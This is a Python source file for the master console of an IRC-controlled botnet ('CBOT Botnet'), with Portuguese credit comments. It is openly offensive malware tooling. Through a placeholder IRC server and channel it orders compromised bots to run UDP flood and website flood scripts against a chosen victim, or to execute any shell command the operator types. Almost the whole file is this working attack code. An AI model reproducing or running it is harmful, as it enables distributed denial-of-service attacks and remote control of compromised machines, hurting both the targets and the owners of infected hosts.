#!/usr/bin/python

import socket
import time
import subprocess
import sys
import random
import time

#All credits: Flet
#Se Não Usar Esta Botnet, Não Edite Nada.
#Por favor, Caso va Divulgar Deixe os Creditos. Caso Contrario Strike!
print "Connecting To Botnet..."

#Configurações do servidor
server = "SERVIDOR IRC"
channel = "CANAL"
#Nome do master ao logar no servidor irc.
nick = "Master" + str(random.randint(1, 15))

def run_command(command):
        output = ''
        command = command.rstrip()
	output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in iter(output.stdout.readline, ''):
		irc.send("PRIVMSG "+channel+" :"+line)
                sys.stdout.flush()

while 1:

	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			irc.connect((server, 6667))
			break;
		except:
			pass		
	time.sleep(1)
	irc.send("USER "+nick+" "+nick+" "+nick+" : CBOT BOTNET V1 !\r\n")
	print '\033[37m'+'Connecting To Server ['+ '\033[0;0m' + '\033[32m'+'Ok' + '\033[0;0m' + '\033[37m' + ']'+'\033[0;0m'
	time.sleep(1)
	print '\033[37m'+'Connecting To Channel ['+ '\033[0;0m' + '\033[32m'+'Ok'+'\033[0;0m' + '\033[37m' + ']'+'\033[0;0m'
	irc.send("NICK "+nick+"\n")
	time.sleep(1)
	irc.send("JOIN "+channel+"\n")

	print '                                             '
	print '\033[31m'+'  ::::::::  :::::::::   :::::::: ::::::::::: '+'\033[0;0m'
	print '\033[31m'+' :+:    :+: :+:    :+: :+:    :+:    :+:     '+'\033[0;0m'
	print '\033[31m'+' +:+        +:+    +:+ +:+    +:+    +:+     '+'\033[0;0m'
	print '\033[34m'+' +#+        +#++:++#+  +#+    +:+    +#+     '+'\033[0;0m'
	print '\033[34m'+' +#+        +#+    +#+ +#+    +#+    +#+     '+'\033[0;0m'
	print '\033[34m'+' #+#    #+# #+#    #+# #+#    #+#    #+#     '+'\033[0;0m'
	print '\033[34m'+'  ########  #########   ########     ###     \n'+'\033[0;0m'
	print '\033[34m'+'  Github => https://github.com/Fletzinho/    \n'+'\033[0;0m'
	print '\033[31m'+'             CBOT Botnet '+'\033[0;0m'+ '\033[34m'+'@2018             \n'+'\033[0;0m'
	terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')

	while True:
		time.sleep(0.1)
		try: 
			text=irc.recv(2040)
		except Exception:
			pass
		if terminal == ("ddos -t ipaddress"):
			vitim = raw_input("Which is you vitim? ") 
			port = raw_input("Which is port? ") 
			temp = raw_input("Which is time? ")
			irc.send("PRIVMSG "+channel+" :!all bash perl udp.pl " + vitim + " " + port + " " + temp + " 1024\r\n")
			print ("DDos Was Started Sucess, In " + vitim + ":" + port + " Per " + temp) 
			terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
		elif terminal == ("ddos -t website"):
			vitim = raw_input("Which is you vitim? ") 
			temp = raw_input("Which is time? ")
			irc.send("PRIVMSG "+channel+" :!all bash python webabuser.py " + vitim + " " + temp + "\r\n")
			print ("DDos Was Send Sucess, In http://" + vitim + " Per " + temp) 
			terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
		elif terminal == ("all -exec quit"):
			irc.send("PRIVMSG "+channel+" :!all quit\r\n")
			print "All bots quit!"
			terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
		elif terminal == ("all -exec command"):
			command = raw_input("Which is Command for execute in all bots (enter cancel for stop.)? ")
			if command == "cancel":
				terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
			else:
				irc.send("PRIVMSG "+channel+" :!all bash " + command + "\r\n")
				print "Command Executed Sucess, Response:"
				print(text)
		elif terminal == ("help"):
			print "ddos -t ipaddress (for start ddos in ipaddress)"
			print "ddos -t website (for start ddos attack in website)"
			print "all -exec command (for execute command in linux bots)"
			print "all -exec quit (for quit all bots)"
			print "help (for help comands)"
			terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
		else:
			print "Error. Command Does Not Exist!"
			terminal = raw_input('\033[34m' + "master" + '\033[0;0m' + '\033[31m'+"@botnet:~$ "+'\033[0;0m')
	sys.exit()
on
